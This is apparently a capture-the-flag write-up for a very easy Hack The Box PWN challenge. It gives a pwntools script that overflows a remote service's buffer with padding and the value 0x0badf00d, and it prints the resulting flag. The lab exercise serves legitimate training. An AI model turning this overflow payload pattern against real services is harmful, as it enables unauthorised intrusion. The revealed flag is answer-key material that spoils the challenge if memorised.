# Challenge: Getting Started (PWN)

## Challenge Overview

**Name:** Getting Started
**Category:** PWN
**Difficulty:** Very Easy

### Description:

Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

---

# Challenge Progress: Getting Started (PWN)

## Exploit Steps

### Step 1: Install pwntools
Install `pwntools` on your WSL environment:
```bash
pip3 install pwntools
```

### Step 2: Create Exploit Script
Create a Python script named `wrapper.py` and paste the following code:
```python
#!/usr/bin/python3.8

from pwn import *
from time import sleep

IP = '94.237.56.47'
PORT = 58911

r = remote(IP, PORT)

payload  = b'A' * 32           
payload += b'B' * 8           
payload += p64(0x0badf00d)     

r.sendline(payload)
sleep(1)
response = r.recvall()

if b'HTB' in response:
    success(f'Flag --> {response.strip().decode()}')
else:
    print("Flag not found.")
```

### Step 3: Run the Exploit
Execute the exploit with:
```bash
python3 wrapper.py
```

### Expected Output
If successful, the script will display the flag:
```
[+] Opening connection to 94.237.56.47 on port 58911: Done
[+] Flag --> HTB{b0f_tut0r14l5_4r3_g00d}
```

May god with us~